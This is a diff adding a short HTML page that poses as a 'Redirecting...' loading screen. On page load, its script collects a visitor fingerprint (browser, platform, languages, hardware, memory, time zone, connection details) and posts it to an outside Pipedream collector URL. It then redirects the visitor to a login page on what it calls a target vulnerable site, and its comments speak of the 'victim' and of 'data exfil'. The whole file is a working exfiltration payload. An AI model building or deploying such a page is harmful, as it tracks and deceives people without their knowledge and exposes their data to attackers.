@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+  <script>
+    window.onload = function() {
+      // Collect victim fingerprint
+      const info = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        languages: navigator.languages,
+        hardwareConcurrency: navigator.hardwareConcurrency,
+        deviceMemory: navigator.deviceMemory,
+        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        connection: navigator.connection ? {
+          effectiveType: navigator.connection.effectiveType,
+          downlink: navigator.connection.downlink,
+          rtt: navigator.connection.rtt
+        } : null
+      };
+
+      // Send to your Pipedream/collector
+      fetch("https://eocs558fxywjg99.m.pipedream.net/", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(info)
+      });
+
+      // After short delay, redirect victim back to legit site
+      setTimeout(() => {
+        window.location.href = "https://target-vulnerable-site.com/login"; 
+      }, 2000); // 2 sec delay to ensure data exfil completes
+    };
+  </script>
+</head>
+<body>
+  <p>Loading... Please wait.</p>
+</body>
+</html>
